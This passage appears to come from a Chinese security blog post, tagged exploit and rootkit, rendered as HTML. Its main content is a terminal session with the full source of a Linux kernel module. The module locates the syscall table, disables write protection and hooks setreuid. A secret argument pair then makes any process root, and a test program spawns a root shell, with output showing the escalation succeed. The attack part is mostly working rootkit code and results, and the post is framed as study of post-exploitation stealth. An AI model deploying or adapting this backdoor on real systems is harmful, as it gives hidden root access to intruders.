class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">r00t@r00t:~/Linux_kernel/LKM/Dynamical_Get_SysCallTable$ ls</span><br><span class="line">kernel_sys.c  Makefile  test.c</span><br><span class="line">r00t@r00t:~/Linux_kernel/LKM/Dynamical_Get_SysCallTable$ cat kernel_sys.c </span><br><span class="line"><span class="comment">#include &lt;linux/init.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/kernel.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/module.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/proc_fs.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/syscalls.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/kallsyms.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/sched.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;asm/uaccess.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;asm/unistd.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/kernel.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/init.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/module.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/syscalls.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/file.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/fs.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/fcntl.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;asm/uaccess.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/version.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/syscalls.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/slab.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define PROC_V          &quot;/proc/version&quot;</span></span><br><span class="line"><span class="comment">#define BOOT_PATH       &quot;/boot/System.map-&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#define MAX_LEN         256</span></span><br><span class="line"> </span><br><span class="line">unsigned long *syscall_table; </span><br><span class="line">int sys_found = 0;</span><br><span class="line"> </span><br><span class="line">asmlinkage int (* orig_setreuid) (uid_t ruid, uid_t euid);</span><br><span class="line"> </span><br><span class="line">asmlinkage int new_setreuid (uid_t ruid, uid_t euid) &#123;</span><br><span class="line"> </span><br><span class="line">    struct cred *new;</span><br><span class="line"> </span><br><span class="line">     <span class="keyword">if</span> ((ruid == 7310) &amp;&amp; (euid == 0137))   &#123;</span><br><span class="line"> </span><br><span class="line">         printk(KERN_ALERT <span class="string">&quot;[Correct] \n&quot;</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">#if LINUX_VERSION_CODE &lt; KERNEL_VERSION(2, 6, 29)    </span></span><br><span class="line">                                 </span><br><span class="line">            current-&gt;uid = current -&gt; gid = 0;</span><br><span class="line">            current -&gt; euid = current -&gt; egid = 0;</span><br><span class="line">            current -&gt; suid = current -&gt; sgid = 0;</span><br><span class="line">            current -&gt; fsuid = current -&gt; fsgid = 0;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">#else</span></span><br><span class="line"> </span><br><span class="line">            new = prepare_creds();</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> ( new != NULL ) &#123;</span><br><span class="line"> </span><br><span class="line">                new-&gt;uid = GLOBAL_ROOT_UID;</span><br><span class="line">		new-&gt;gid = GLOBAL_ROOT_GID;</span><br><span class="line">                new-&gt;euid = GLOBAL_ROOT_UID;</span><br><span class="line">		new-&gt;egid = GLOBAL_ROOT_GID;</span><br><span class="line">                new-&gt;suid = GLOBAL_ROOT_UID;</span><br><span class="line">		new-&gt;sgid = GLOBAL_ROOT_GID;</span><br><span class="line">                new-&gt;fsuid = GLOBAL_ROOT_UID;</span><br><span class="line">		new-&gt;fsgid = GLOBAL_ROOT_GID;</span><br><span class="line"> </span><br><span class="line">                commit_creds(new);</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="comment">#endif</span></span><br><span class="line"> </span><br><span class="line">         <span class="built_in">return</span> orig_setreuid (0, 0);</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     <span class="built_in">return</span> orig_setreuid (ruid, euid);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">char *search_file(char *buf) &#123;</span><br><span class="line">     </span><br><span class="line">    struct file *f;</span><br><span class="line">    char *ver;</span><br><span class="line">    mm_segment_t oldfs;</span><br><span class="line"> </span><br><span class="line">    oldfs = get_fs();</span><br><span class="line">    set_fs (KERNEL_DS);</span><br><span class="line">     </span><br><span class="line">    f = filp_open(PROC_V, O_RDONLY, 0);</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span> ( IS_ERR(f) || ( f == NULL )) &#123;</span><br><span class="line">     </span><br><span class="line">        <span class="built_in">return</span> NULL;</span><br><span class="line">     </span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    memset(buf, 0, MAX_LEN);</span><br><span class="line">     </span><br><span class="line">    vfs_read(f, buf, MAX_LEN, &amp;f-&gt;f_pos);</span><br><span class="line">     </span><br><span class="line">    ver = strsep(&amp;buf, <span class="string">&quot; &quot;</span>);</span><br><span class="line">    ver = strsep(&amp;buf, <span class="string">&quot; &quot;</span>);</span><br><span class="line">    ver = strsep(&amp;buf, <span class="string">&quot; &quot;</span>);</span><br><span class="line">         </span><br><span class="line">    filp_close(f, 0);   </span><br><span class="line">    set_fs(oldfs);</span><br><span class="line">     </span><br><span class="line">    <span class="built_in">return</span> ver;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">static int find_sys_call_table (char *kern_ver)</span><br><span class="line"> &#123;</span><br><span class="line"> </span><br><span class="line">    char buf[MAX_LEN];</span><br><span class="line">    int i = 0;</span><br><span class="line">    char *filename;</span><br><span class="line">    char *p;</span><br><span class="line">    struct file *f = NULL;</span><br><span class="line"> </span><br><span class="line">    mm_segment_t oldfs;</span><br><span class="line"> </span><br><span class="line">    oldfs = get_fs();</span><br><span class="line">    set_fs (KERNEL_DS);</span><br><span class="line">     </span><br><span class="line">    filename = kmalloc(strlen(kern_ver)+strlen(BOOT_PATH)+1, GFP_KERNEL);</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span> ( filename == NULL ) &#123;</span><br><span class="line">     </span><br><span class="line">        <span class="built_in">return</span> -1;</span><br><span class="line">     </span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    memset(filename, 0, strlen(BOOT_PATH)+strlen(kern_ver)+1);</span><br><span class="line">     </span><br><span class="line">    strncpy(filename, BOOT_PATH, strlen(BOOT_PATH));</span><br><span class="line">    strncat(filename, kern_ver, strlen(kern_ver));</span><br><span class="line">     </span><br><span class="line">    printk(KERN_ALERT <span class="string">&quot;\nPath %s\n&quot;</span>, filename);</span><br><span class="line">     </span><br><span class="line">    f = filp_open(filename, O_RDONLY, 0);</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span> ( IS_ERR(f) || ( f == NULL )) &#123;</span><br><span class="line">     </span><br><span class="line">        <span class="built_in">return</span> -1;</span><br><span class="line">     </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    memset(buf, 0x0, MAX_LEN);</span><br><span class="line"> </span><br><span class="line">    p = buf;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">while</span> (vfs_read(f, p+i, 1, &amp;f-&gt;f_pos) == 1) &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> ( p[i] == <span class="string">&#x27;\n&#x27;</span> || i == 255 ) &#123;</span><br><span class="line">         </span><br><span class="line">            i = 0;</span><br><span class="line">             </span><br><span class="line">            <span class="keyword">if</span> ( (strstr(p, <span class="string">&quot;sys_call_table&quot;</span>)) != NULL ) &#123;</span><br><span class="line">                 </span><br><span class="line">                char *sys_string;</span><br><span class="line">                 </span><br><span class="line">                sys_string = kmalloc(MAX_LEN, GFP_KERNEL);  </span><br><span class="line">                 </span><br><span class="line">                <span class="keyword">if</span> ( sys_string == NULL ) &#123; </span><br><span class="line">                 </span><br><span class="line">                    filp_close(f, 0);</span><br><span class="line">                    set_fs(oldfs);</span><br><span class="line">     </span><br><span class="line">                    kfree(filename);</span><br><span class="line">     </span><br><span class="line">                    <span class="built_in">return</span> -1;</span><br><span class="line">     </span><br><span class="line">                &#125;</span><br><span class="line"> </span><br><span class="line">                memset(sys_string, 0, MAX_LEN);</span><br><span class="line">                strncpy(sys_string, strsep(&amp;p, <span class="string">&quot; &quot;</span>), MAX_LEN);</span><br><span class="line">             </span><br><span class="line">                syscall_table = (unsigned long long *) simple_strtoll(sys_string, NULL, 16);</span><br><span class="line">                 </span><br><span class="line">                kfree(sys_string);</span><br><span class="line">                 </span><br><span class="line">                <span class="built_in">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">             </span><br><span class="line">            memset(buf, 0x0, MAX_LEN);</span><br><span class="line">            <span class="built_in">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">         </span><br><span class="line">        i++;</span><br><span class="line">     </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    filp_close(f, 0);</span><br><span class="line">    set_fs(oldfs);</span><br><span class="line">     </span><br><span class="line">    kfree(filename);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">static int init(void) &#123;</span><br><span class="line"> </span><br><span class="line">    char *kern_ver;</span><br><span class="line">    char *buf;</span><br><span class="line">     </span><br><span class="line">    buf = kmalloc(MAX_LEN, GFP_KERNEL);</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span> ( buf == NULL ) &#123;</span><br><span class="line">     </span><br><span class="line">        sys_found = 1;</span><br><span class="line">        <span class="built_in">return</span> -1;</span><br><span class="line">     </span><br><span class="line">    &#125;   </span><br><span class="line"> </span><br><span class="line">    printk(KERN_ALERT <span class="string">&quot;\nHIJACK INIT\n&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    kern_ver = search_file(buf);</span><br><span class="line">         </span><br><span class="line">    <span class="keyword">if</span> ( kern_ver == NULL ) &#123;</span><br><span class="line"> </span><br><span class="line">        sys_found = 1;</span><br><span class="line">        <span class="built_in">return</span> -1;</span><br><span class="line">     </span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    printk(KERN_ALERT <span class="string">&quot;Kernel version found: %s\n&quot;</span>, kern_ver);</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span> ( find_sys_call_table(kern_ver) == -1 ) &#123;</span><br><span class="line">     </span><br><span class="line">        sys_found = 1;</span><br><span class="line">        <span class="built_in">return</span> -1;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    sys_found = 0;</span><br><span class="line">     </span><br><span class="line">    write_cr0 (read_cr0 () &amp; (~ 0x10000));</span><br><span class="line">     </span><br><span class="line">    orig_setreuid = syscall_table[__NR_setreuid32];</span><br><span class="line">    syscall_table[__NR_setreuid32] = new_setreuid;</span><br><span class="line"> </span><br><span class="line">    write_cr0 (read_cr0 () | 0x10000);</span><br><span class="line">     </span><br><span class="line">    kfree(buf);</span><br><span class="line">     </span><br><span class="line">    <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">static void <span class="built_in">exit</span>(void) &#123;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span> ( sys_found == 0 ) &#123;</span><br><span class="line">     </span><br><span class="line">        write_cr0 (read_cr0 () &amp; (~ 0x10000));</span><br><span class="line"> </span><br><span class="line">        syscall_table[__NR_setreuid32] = orig_setreuid;</span><br><span class="line"> </span><br><span class="line">        write_cr0 (read_cr0 () | 0x10000);</span><br><span class="line">     </span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    printk(KERN_ALERT <span class="string">&quot;\nHIJACK EXIT\n&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">module_init(init);</span><br><span class="line">module_exit(<span class="built_in">exit</span>);</span><br><span class="line">r00t@r00t:~/Linux_kernel/LKM/Dynamical_Get_SysCallTable$ make</span><br><span class="line">make -C /lib/modules/4.2.2/build SUBDIRS=/home/r00t/Linux_kernel/LKM/Dynamical_Get_SysCallTable modules</span><br><span class="line">make[1]: Entering directory <span class="string">&#x27;/usr/src/linux-4.2.2&#x27;</span></span><br><span class="line">  CC [M]  /home/r00t/Linux_kernel/LKM/Dynamical_Get_SysCallTable/kernel_sys.o</span><br><span class="line">/home/r00t/Linux_kernel/LKM/Dynamical_Get_SysCallTable/kernel_sys.c: In <span class="keyword">function</span> ‘find_sys_call_table’:</span><br><span class="line">/home/r00t/Linux_kernel/LKM/Dynamical_Get_SysCallTable/kernel_sys.c:171:33: warning: cast to pointer from <span class="built_in">integer</span> of different size [-Wint-to-pointer-cast]</span><br><span class="line">                 syscall_table = (unsigned long long *) simple_strtoll(sys_string, NULL, 16);</span><br><span class="line">                                 ^</span><br><span class="line">/home/r00t/Linux_kernel/LKM/Dynamical_Get_SysCallTable/kernel_sys.c:171:31: warning: assignment from incompatible pointer <span class="built_in">type</span> [-Wincompatible-pointer-types]</span><br><span class="line">                 syscall_table = (unsigned long long *) simple_strtoll(sys_string, NULL, 16);</span><br><span class="line">                               ^</span><br><span class="line">/home/r00t/Linux_kernel/LKM/Dynamical_Get_SysCallTable/kernel_sys.c: In <span class="keyword">function</span> ‘init’:</span><br><span class="line">/home/r00t/Linux_kernel/LKM/Dynamical_Get_SysCallTable/kernel_sys.c:231:19: warning: assignment makes pointer from <span class="built_in">integer</span> without a cast [-Wint-conversion]</span><br><span class="line">     orig_setreuid = syscall_table[__NR_setreuid32];</span><br><span class="line">                   ^</span><br><span class="line">/home/r00t/Linux_kernel/LKM/Dynamical_Get_SysCallTable/kernel_sys.c:232:36: warning: assignment makes <span class="built_in">integer</span> from pointer without a cast [-Wint-conversion]</span><br><span class="line">     syscall_table[__NR_setreuid32] = new_setreuid;</span><br><span class="line">                                    ^</span><br><span class="line">/home/r00t/Linux_kernel/LKM/Dynamical_Get_SysCallTable/kernel_sys.c: In <span class="keyword">function</span> ‘<span class="built_in">exit</span>’:</span><br><span class="line">/home/r00t/Linux_kernel/LKM/Dynamical_Get_SysCallTable/kernel_sys.c:247:40: warning: assignment makes <span class="built_in">integer</span> from pointer without a cast [-Wint-conversion]</span><br><span class="line">         syscall_table[__NR_setreuid32] = orig_setreuid;</span><br><span class="line">                                        ^</span><br><span class="line">  Building modules, stage 2.</span><br><span class="line">  MODPOST 1 modules</span><br><span class="line">  CC      /home/r00t/Linux_kernel/LKM/Dynamical_Get_SysCallTable/kernel_sys.mod.o</span><br><span class="line">  LD [M]  /home/r00t/Linux_kernel/LKM/Dynamical_Get_SysCallTable/kernel_sys.ko</span><br><span class="line">make[1]: Leaving directory <span class="string">&#x27;/usr/src/linux-4.2.2&#x27;</span></span><br><span class="line">r00t@r00t:~/Linux_kernel/LKM/Dynamical_Get_SysCallTable$ cat test.c </span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"> </span><br><span class="line">int <span class="function"><span class="title">main</span></span> () &#123;</span><br><span class="line"> </span><br><span class="line">        setreuid (7310, 0137);</span><br><span class="line">        system (<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br><span class="line">r00t@r00t:~/Linux_kernel/LKM/Dynamical_Get_SysCallTable$ id</span><br><span class="line">uid=1000(r00t) gid=1000(r00t) groups=1000(r00t),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)</span><br><span class="line">r00t@r00t:~/Linux_kernel/LKM/Dynamical_Get_SysCallTable$ ls</span><br><span class="line">kernel_sys.c   kernel_sys.mod.c  kernel_sys.o  modules.order   test.c</span><br><span class="line">kernel_sys.ko  kernel_sys.mod.o  Makefile      Module.symvers</span><br><span class="line">r00t@r00t:~/Linux_kernel/LKM/Dynamical_Get_SysCallTable$ sudo insmod kernel_sys.ko</span><br><span class="line">r00t@r00t:~/Linux_kernel/LKM/Dynamical_Get_SysCallTable$ dmesg | tail -n 4</span><br><span class="line">               HIJACK INIT</span><br><span class="line">[ 2537.374798] Kernel version found: 4.2.2</span><br><span class="line">[ 2537.374802] </span><br><span class="line">               Path /boot/System.map-4.2.2</span><br><span class="line">r00t@r00t:~/Linux_kernel/LKM/Dynamical_Get_SysCallTable$ gcc -o <span class="built_in">test</span> test.c </span><br><span class="line">test.c: In <span class="keyword">function</span> ‘main’:</span><br><span class="line">test.c:5:9: warning: implicit declaration of <span class="keyword">function</span> ‘setreuid’ [-Wimplicit-function-declaration]</span><br><span class="line">         setreuid (7310, 0137);</span><br><span class="line">         ^</span><br><span class="line">test.c:6:9: warning: implicit declaration of <span class="keyword">function</span> ‘system’ [-Wimplicit-function-declaration]</span><br><span class="line">         system (<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">         ^</span><br><span class="line">r00t@r00t:~/Linux_kernel/LKM/Dynamical_Get_SysCallTable$ ./<span class="built_in">test</span> </span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),1000(r00t)</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
+</ul>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>后续实验应该会参照谷大神的<a target="_blank" rel="noopener" href="https://github.com/NoviceLive/research-rootkit">教程</a>继续学习，关于其防范策略目前还没有什么非常好用的方法，只能靠管理员多注意了。在后渗透测试阶段此隐蔽性非常强，特别是内核级的相对于应用级的更加难以发现，其中有一个应用级的用bash实现的可以<a target="_blank" rel="noopener" href="https://github.com/cloudsec/brootkit">参考学习</a>。</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/embpgp.github.io/tags/C-C/" rel="tag"># C/C++</a>
+              <a href="/embpgp.github.io/tags/exploit/" rel="tag"># exploit</a>
+              <a href="/embpgp.github.io/tags/r00tk1t/" rel="tag"># r00tk1t</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/embpgp.github.io/2017/01/07/fmt-exploit/" rel="prev" title="fmt_exploit">
+      <i class="fa fa-chevron-left"></i> fmt_exploit
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/embpgp.github.io/2017/03/05/%E7%AB%AF%E5%88%B0%E7%AB%AF%E5%8A%A0%E5%AF%86IM%E9%A2%84%E6%83%B3/" rel="next" title="端到端加密IM预想">
+      端到端加密IM预想 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#What%E2%80%99s-this"><span class="nav-number">1.</span> <span class="nav-text">What’s this?</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83"><span class="nav-number">2.</span> <span class="nav-text">实验环境</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BC%96%E8%AF%91%E9%83%A8%E5%88%86"><span class="nav-number">3.</span> <span class="nav-text">编译部分</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#LKM"><span class="nav-number">4.</span> <span class="nav-text">LKM</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Kernel-Hook"><span class="nav-number">5.</span> <span class="nav-text">Kernel Hook</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8A%A8%E6%80%81%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E8%A1%A8"><span class="nav-number">6.</span> <span class="nav-text">动态获取系统调用表</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">7.</span> <span class="nav-text">总结</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="rutk1t0r"
+      src="/embpgp.github.io/images/avatar.png">
+  <p class="site-author-name" itemprop="name">rutk1t0r</p>
+  <div class="site-description" itemprop="description">gnireenigne 0x41414141 \xff\xe4\xcc</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/embpgp.github.io/archives/">
+        
+          <span class="site-state-item-count">39</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/embpgp.github.io/categories/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/embpgp.github.io/tags/">
+          
+        <span class="site-state-item-count">29</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/embpgp" title="Github → https:&#x2F;&#x2F;github.com&#x2F;embpgp" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>Github</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/rutk1t0r" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;rutk1t0r" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="http://www.hicoder.cn/" title="http:&#x2F;&#x2F;www.hicoder.cn" rel="noopener" target="_blank">Yuan</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.cnblogs.com/fangyz" title="http:&#x2F;&#x2F;www.cnblogs.com&#x2F;fangyz" rel="noopener" target="_blank">Fangyz</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://watch0.top/" title="http:&#x2F;&#x2F;watch0.top" rel="noopener" target="_blank">w@tch0</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2016 – 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">rutk1t0r</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">Symbols count total: </span>
+    <span title="Symbols count total">149k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">Reading time total &asymp;</span>
+    <span title="Reading time total">2:16</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+        
